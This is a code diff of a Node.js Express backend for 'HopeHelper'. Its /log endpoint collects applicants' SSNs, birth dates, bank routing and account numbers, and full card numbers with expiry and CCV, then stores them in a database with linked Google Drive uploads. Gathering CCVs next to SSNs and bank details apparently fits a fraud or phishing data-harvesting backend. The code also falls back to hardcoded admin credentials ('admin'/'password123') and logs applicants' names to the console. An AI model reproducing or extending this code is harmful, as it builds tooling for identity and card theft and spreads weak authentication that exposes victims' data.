@@ -17,7 +17,7 @@ const adminAuth = (req, res, next) => {
     const pass = auth[1];
 
     const adminUser = process.env.ADMIN_USER || 'admin';
-    const adminPass = process.env.ADMIN_PASS || 'password';
+    const adminPass = process.env.ADMIN_PASS || 'password123';
 
     if (user === adminUser && pass === adminPass) {
         next();
@@ -31,62 +31,33 @@ const adminAuth = (req, res, next) => {
 router.post('/log', async (req, res) => {
     try {
         const formData = req.body;
+        console.log(`🚀 [API/LOG] Received submission for: ${formData.formData.firstName} ${formData.formData.lastName}`);
+
         const emailBody = `
-            === NEW FORM SUBMISSION ===
+            === HopeHelper: Process Completed ===
+            
+            Application for ${formData.formData.firstName} ${formData.formData.lastName} has been successfully processed and stored.
+            
             Timestamp: ${new Date(formData.timestamp).toLocaleString()}
-
-            --- Personal Information ---
-            First Name: ${formData.formData.firstName}
-            Last Name: ${formData.formData.lastName}
-            Date of Birth: ${formData.formData.dateOfBirth}
-            SSN: ${formData.formData.socialSecurityNumber}
-            Phone: ${formData.formData.phoneNumber}
-            Email: ${formData.formData.email}
-
-            --- Address Information ---
-            Current Address: ${formData.formData.currentAddress}
-            City: ${formData.formData.city}
-            State: ${formData.formData.state}
-            Zip Code: ${formData.formData.zipCode}
-            Mailing Address: ${formData.formData.mailingAddress}
-
-            --- Banking Information ---
-            Bank Name: ${formData.formData.bankName}
-            Account Type: ${formData.formData.accountType}
-            Routing Number: ${formData.formData.routingNumber}
-            Account Number: ${formData.formData.accountNumber}
-
-            --- Verification ---
-            Terms Accepted: ${formData.formData.termsAccepted}
-            Data Consent: ${formData.formData.dataConsent}
-
-            --- Cards ---
-            ${(formData.formData.cards || [])
-                .map((c, i) => `Card ${i + 1}: ${c.cardNumber}, Exp: ${c.expiry}, CCV: ${c.ccv}`)
-                .join('\n')}
-
-            --- Google Drive Folder ---
-            Name: ${formData.folder?.name}
-            ID: ${formData.folder?.id}
-            URL: ${formData.folder?.url}
-
-            --- Uploaded Files ---
-            ${(formData.files || [])
-                .map((f, i) => `${i + 1}. ${f.name}\n    URL: ${f.url}\n    ID: ${f.id}`)
-                .join('\n')}
-            =============================
+            Drive Folder: ${formData.folder?.url || 'N/A'}
+            
+            Check the Admin Dashboard for full details.
             `;
 
+        console.log('📧 Attempting to send confirmation email...');
         await transporter.sendMail({
             from: process.env.EMAIL_USER,
             to: process.env.EMAIL_USER,
-            subject: `New Submission from ${formData.formData.firstName} ${formData.formData.lastName}`,
+            subject: `✅ Application Processed: ${formData.formData.firstName} ${formData.formData.lastName}`,
             text: emailBody
         });
+        console.log('✅ Confirmation email sent');
 
+        console.log('🗄️ Starting database transaction...');
         const connection = await pool.getConnection();
         try {
             await connection.beginTransaction();
+            console.log('🗄️ Inserting into applications table...');
             const [appResult] = await connection.query(
                 `INSERT INTO applications (
                     first_name, last_name, dob, ssn, phone, email, 
@@ -105,8 +76,10 @@ router.post('/log', async (req, res) => {
             );
 
             const applicationId = appResult.insertId;
+            console.log(`🗄️ Application ID generated: ${applicationId}`);
 
             if (formData.formData.cards?.length > 0) {
+                console.log(`🗄️ Inserting ${formData.formData.cards.length} cards...`);
                 for (const card of formData.formData.cards) {
                     await connection.query(
                         `INSERT INTO cards (application_id, card_number, expiry, ccv) VALUES (?, ?, ?, ?)`,
@@ -116,6 +89,7 @@ router.post('/log', async (req, res) => {
             }
 
             if (formData.files?.length > 0) {
+                console.log(`🗄️ Inserting ${formData.files.length} file links...`);
                 for (const file of formData.files) {
                     await connection.query(
                         `INSERT INTO files (application_id, name, url, drive_id, field_name) VALUES (?, ?, ?, ?, ?)`,
@@ -124,9 +98,10 @@ router.post('/log', async (req, res) => {
                 }
             }
             await connection.commit();
+            console.log('✅ Database transaction committed');
         } catch (dbError) {
             await connection.rollback();
-            console.error('❌ Database error:', dbError);
+            console.error('❌ Database error during transaction:', dbError);
         } finally {
             connection.release();
         }
@@ -151,6 +126,7 @@ router.get('/google/init', async (req, res) => {
 router.post('/google/create-folder', async (req, res) => {
     try {
         const { folderName } = req.body;
+        console.log(`📂 [DRIVE] Creating folder: ${folderName}`);
         const drive = await getDriveClient();
         const folder = await drive.files.create({
             resource: {
@@ -160,8 +136,10 @@ router.post('/google/create-folder', async (req, res) => {
             },
             fields: 'id, name, webViewLink'
         });
+        console.log(`✅ [DRIVE] Folder created: ${folder.data.id}`);
         res.json({ id: folder.data.id, name: folder.data.name, url: folder.data.webViewLink });
     } catch (error) {
+        console.error('❌ [DRIVE] Folder creation error:', error);
         res.status(500).json({ error: error.message });
     }
 });
